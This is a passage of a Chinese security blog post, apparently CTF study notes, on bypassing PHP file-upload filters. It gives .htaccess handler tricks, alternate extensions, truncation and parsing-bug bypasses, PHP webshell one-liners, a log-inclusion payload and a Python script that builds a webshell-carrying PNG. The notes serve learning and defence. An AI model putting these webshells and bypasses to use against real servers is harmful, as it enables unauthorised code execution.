+<p>(正好.htaccess 通过 <code>#</code> 来注释, 后来了解到还有 <code>\x00</code>)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define width 1</span></span><br><span class="line"><span class="comment">#define height 1</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;hey.hey&quot;</span>&gt;</span><br><span class="line">SetHandler  application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="过滤php："><a href="#过滤php：" class="headerlink" title="过滤php："></a>过滤php：</h5><ul>
+<li>可以用特殊后缀名：</li>
+</ul>
+<blockquote>
+<p>Php|php2|php3|php4|php5|php6|php7|pht|phtm| <strong>phtml</strong></p>
+</blockquote>
+<ul>
+<li>可以用长标签：</li>
+</ul>
+<script language='php'>evalxxxx;</script>
+
+<ul>
+<li>可以用短标签：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">=@eval(@$_POST[&#x27;ctf&#x27;]);</span><br><span class="line">//@是错误抑制符，=相当于php echo</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>关于短标签：</li>
+</ul>
+<p><img src="/..%5Cimages%5Ca01af52b7d1925b10adc1a52c3448fb.png"></p>
+<h5 id="双写绕过-xx-phphpp"><a href="#双写绕过-xx-phphpp" class="headerlink" title="双写绕过:xx.phphpp"></a>双写绕过:xx.phphpp</h5><h5 id="绕过-move-uploaded-file-pathinfo"><a href="#绕过-move-uploaded-file-pathinfo" class="headerlink" title="&#x2F;.绕过:move_uploaded_file+pathinfo"></a>&#x2F;.绕过:move_uploaded_file+pathinfo</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;url.php&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;url.php/.hh&#x27;</span>;</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$a</span>, PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_ext</span>;  <span class="comment">#php</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$b</span>, PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file_ext</span>;  <span class="comment">#hh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#且move_uploaded_file会自动去除/.中的.</span></span><br><span class="line">就可以传入name=<span class="number">1</span>.php/.来绕过php后缀检测，同时文件保存时会被保存为php文件</span><br></pre></td></tr></table></figure>
+
+<h5 id="配合解析漏洞"><a href="#配合解析漏洞" class="headerlink" title="配合解析漏洞:"></a>配合解析漏洞:</h5><ul>
+<li><p>Apache HTTPD 换行解析漏洞:<code>1.php\x0A</code>将被按照PHP后缀进行解析</p>
+</li>
+<li><p>Apache HTTPD 多后缀解析漏洞:支持一个文件拥有多个后缀xxx.php.7z会被识别成php文件</p>
+</li>
+<li><p>Nginx 解析漏洞:文件后缀加上&#x2F;.php会当成php被解析</p>
+</li>
+<li><p>IIS7.5解析漏洞:在上传的文件名后面加上<code>/.php</code>，可以被作为PHP文件解析</p>
+</li>
+<li><p>tomcat任意文件上传漏洞，test.jsp&#x2F; 识别为非jsp文件，但是后续保存为test.jsp文件</p>
+</li>
+<li><p>IIS6解析漏洞:</p>
+<p>在<code>.asp</code>、<code>.asa</code>目录下的任意文件都会以<code>asp</code>格式解析;</p>
+<p>上传<code>test.asp;.jpg</code>会被解析为asp;</p>
+<p>IIS 6.0默认的可执行文件除了<code>asp</code>还包含<code>asa</code>、<code>cer</code>、<code>cdx</code>，会将这三种扩展名文件解析为asp文件</p>
+</li>
+</ul>
+<h5 id="服务器windows平台："><a href="#服务器windows平台：" class="headerlink" title="服务器windows平台："></a>服务器windows平台：</h5><table>
+<thead>
+<tr>
+<th>上传文件名</th>
+<th>服务器文件名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file.php[空格]</td>
+<td>file.php</td>
+<td></td>
+</tr>
+<tr>
+<td>file.php[.]</td>
+<td>file.php</td>
+<td>无论多少个.都可以</td>
+</tr>
+<tr>
+<td>file.php[%80-%99]</td>
+<td>file.php</td>
+<td>Burp抓包，在文件名结尾输%80，CTRL+SHIFT+U进行URL-DECODE,或者增加一个空格，再在HEX视图中把20修改为80</td>
+</tr>
+<tr>
+<td>file.php::$DATA</td>
+<td>file.php</td>
+<td>file.php中的实际内容</td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;**白名单**&gt;"></a>&lt;**白名单**&gt;</h4><h5 id="MIME检查"><a href="#MIME检查" class="headerlink" title="MIME检查:"></a>MIME检查:</h5><ul>
+<li><p>抓包,改文件名&#x2F;文件类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/gif`或`Content-Type: image/jpeg`或`Content-Type: image/png</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="00-0x0a-0x00截断"><a href="#00-0x0a-0x00截断" class="headerlink" title="%00,0x0a,0x00截断:"></a>%00,0x0a,0x00截断:</h5><ul>
+<li>条件:：白名单、上传路径可控、php.ini中的<code>magic_quotes_gpc</code>为off</li>
+<li>..&#x2F;upload&#x2F;5920201223231032.gif; →  ..&#x2F;upload&#x2F;xxx.php%00&#x2F;5920201223231032.gif</li>
+</ul>
+<h3 id="检查内容"><a href="#检查内容" class="headerlink" title="检查内容:"></a>检查内容:</h3><h4 id="exif-imagetype文件头检查"><a href="#exif-imagetype文件头检查" class="headerlink" title="exif_imagetype文件头检查:"></a>exif_imagetype文件头检查:</h4><p>gif的文件头为<code>GIF89a</code>；<code>png</code>的文件头为<code>89504E47</code>；<code>jpg</code>的文件头为<code>FFD8FF</code></p>
+<h4 id="png二次渲染："><a href="#png二次渲染：" class="headerlink" title="png二次渲染："></a>png二次渲染：</h4><p>生成图片马（<?=$_GET[0]($_POST[1]);?>）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始 RGB 颜色数据</span></span><br><span class="line">p = [</span><br><span class="line">    <span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 32x32 图片</span></span><br><span class="line">img = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">32</span>, <span class="number">32</span>), (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">pixels = img.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次填充像素点</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">2</span>, <span class="number">3</span>):</span><br><span class="line">    x = i // <span class="number">3</span>  <span class="comment"># 计算 X 坐标</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">32</span>:  <span class="comment"># 避免超出图片宽度</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    r, g, b = p[i], p[i + <span class="number">1</span>], p[i + <span class="number">2</span>]</span><br><span class="line">    pixels[x, <span class="number">0</span>] = (r, g, b)  <span class="comment"># 仅绘制第一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存图片</span></span><br><span class="line">img.save(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;图片已保存为 1.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他:"></a>其他:</h2><ul>
+<li>过滤[],{}代替;过滤.用\2e</li>
+<li>$_REQUEST绕过:<?php $_REQUEST[1]($_REQUEST[2])?></li>
+<li>反引号来进行命令执行：<?=`tac ../f*`?></li>
+<li>利用文件包含漏洞,包含日志&lt;&#x3D;include”&#x2F;var&#x2F;lo”.”g&#x2F;nginx&#x2F;access.l”.”og”?&gt;</li>
+<li>远程文件包含：ip可以转数字，绕过.限制</li>
+<li>有时会使原文件被覆盖，可用来修改服务器配置……</li>
+<li>unzip可以配合软链接</li>
+</ul>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">夏饭orz</a>
+            <p>原文链接：<a href="http://example.com/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">http://example.com/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</a>
+            <p>发表日期：<a href="http://example.com/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">June 22nd 2025, 2:30:00 pm</a>
+            <p>更新日期：<a href="http://example.com/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">June 22nd 2025, 10:33:09 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/06/22/XS-Leaks/" title="XSleak">
+                    <div class="nextTitle">XSleak</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/06/22/sql/" title="sql小总结">
+                    <div class="prevTitle">sql小总结</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:1844015967@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/nihao5577" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">常见函数：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">本地文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">session条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.3.</span> <span class="toc-text">中间件日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.4.</span> <span class="toc-text">SSH日志文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.5.</span> <span class="toc-text">远程文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">常见敏感文件：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">php伪协议：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AFjs%E6%A0%A1%E9%AA%8C%EF%BC%9A"><span class="toc-number">2.1.1.</span> <span class="toc-text">前端js校验：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%90%8E%E7%BC%80%EF%BC%9A"><span class="toc-number">2.1.2.</span> <span class="toc-text">检查后缀：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">&lt;**黑名单**&gt;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#user-ini%EF%BC%9A"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">.user.ini：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#htaccess"><span class="toc-number">2.1.2.1.2.</span> <span class="toc-text">.htaccess:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4php%EF%BC%9A"><span class="toc-number">2.1.2.1.3.</span> <span class="toc-text">过滤php：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87-xx-phphpp"><span class="toc-number">2.1.2.1.4.</span> <span class="toc-text">双写绕过:xx.phphpp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-move-uploaded-file-pathinfo"><span class="toc-number">2.1.2.1.5.</span> <span class="toc-text">&#x2F;.绕过:move_uploaded_file+pathinfo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E5%90%88%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.1.6.</span> <span class="toc-text">配合解析漏洞:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8windows%E5%B9%B3%E5%8F%B0%EF%BC%9A"><span class="toc-number">2.1.2.1.7.</span> <span class="toc-text">服务器windows平台：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-1"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">&lt;**白名单**&gt;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MIME%E6%A3%80%E6%9F%A5"><span class="toc-number">2.1.2.2.1.</span> <span class="toc-text">MIME检查:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#00-0x0a-0x00%E6%88%AA%E6%96%AD"><span class="toc-number">2.1.2.2.2.</span> <span class="toc-text">%00,0x0a,0x00截断:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%86%85%E5%AE%B9"><span class="toc-number">2.1.3.</span> <span class="toc-text">检查内容:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exif-imagetype%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">exif_imagetype文件头检查:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#png%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%EF%BC%9A"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">png二次渲染：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">2.2.</span> <span class="toc-text">其他:</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 15
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/flask%20pin%E7%A0%81%E8%AE%A1%E7%AE%97&%E5%88%A9%E7%94%A8/">flask pin码计算</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Nodejs原型链污染&命令执行</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">php filter链</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Pickle反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/XS-Leaks/">XSleak</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件包含&文件上传(主php)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/sql/">sql小总结</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/xpath%E6%B3%A8%E5%85%A5/">Xpath注入</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span>
+            <a class="archive-post-title" href="/2025/06/22/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">py原型链污染</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/windows-%E4%B8%8D%E5%8F%AA%E6%98%AF%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">不只是日志分析-windows篇</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B%E6%80%9D%E8%B7%AF/">应急响应常见题目</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/10</span>
+            <a class="archive-post-title" href="/2025/06/10/redis/">redis攻击手法</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="web漏洞">
+                <span class="iconfont-archer">&#xe606;</span>
+                web漏洞
+            </span>
+            <span class="sidebar-tag-name" data-tags="php">
+                <span class="iconfont-archer">&#xe606;</span>
+                php
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="侧信道">
+                <span class="iconfont-archer">&#xe606;</span>
+                侧信道
+            </span>
+            <span class="sidebar-tag-name" data-tags="nodejs">
+                <span class="iconfont-archer">&#xe606;</span>
+                nodejs
+            </span>
+            <span class="sidebar-tag-name" data-tags="注入">
+                <span class="iconfont-archer">&#xe606;</span>
+                注入
+            </span>
+            <span class="sidebar-tag-name" data-tags="windows">
+                <span class="iconfont-archer">&#xe606;</span>
+                windows
+            </span>
+            <span class="sidebar-tag-name" data-tags="日志分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                日志分析
+            </span>
+            <span class="sidebar-tag-name" data-tags="应急响应">
+                <span class="iconfont-archer">&#xe606;</span>
+                应急响应
+            </span>
+            <span class="sidebar-tag-name" data-tags="redis">
+                <span class="iconfont-archer">&#xe606;</span>
+                redis
+            </span>
+            <span class="sidebar-tag-name" data-tags="总结">
+                <span class="iconfont-archer">&#xe606;</span>
+                总结
+            </span>
+            <span class="sidebar-tag-name" data-tags="流量分析">
+                <span class="iconfont-archer">&#xe606;</span>
+                流量分析
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+        <span class="sidebar-category-name" data-categories="web漏洞">
+            <span class="iconfont-archer">&#xe60a;</span>
+            web漏洞
+        </span>
+        <span class="sidebar-category-name" data-categories="应急响应">
+            <span class="iconfont-archer">&#xe60a;</span>
+            应急响应
+        </span>
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://example.com",
+        root: siteMetaRoot,
+        author: "夏饭orz"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+    <!-- Check browser compatibility of CSS variables -->
+    <script>
+        if (browserSupportCSSVariables === undefined) {
+            var browserSupportCSSVariables = window.CSS && window.CSS.supports && window.CSS.supports('--a', 0);
+        }
+    </script>
+    <script>
+        if (browserSupportCSSVariables) {
+            var customFontName = 'Noto Sans SC:n3,n4,n5,n7'
+            var customFontUrl = 'https://chinese-fonts-cdn.deno.dev/packages/ysbth/dist/%E4%BC%98%E8%AE%BE%E6%A0%87%E9%A2%98%E9%BB%91/result.css'
+            if (!customFontName) {
+                console.log('Custom font name is not set or read failed');
+            }
+            if (!customFontUrl) {
+                console.log('Custom font url is not set or read failed');
+            }
+        } else {
+            console.error('Current browser doesn\'t support custom font.')
+        }
+    </script>
+    <script src="/scripts/customFontLoader.js" defer></script>
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
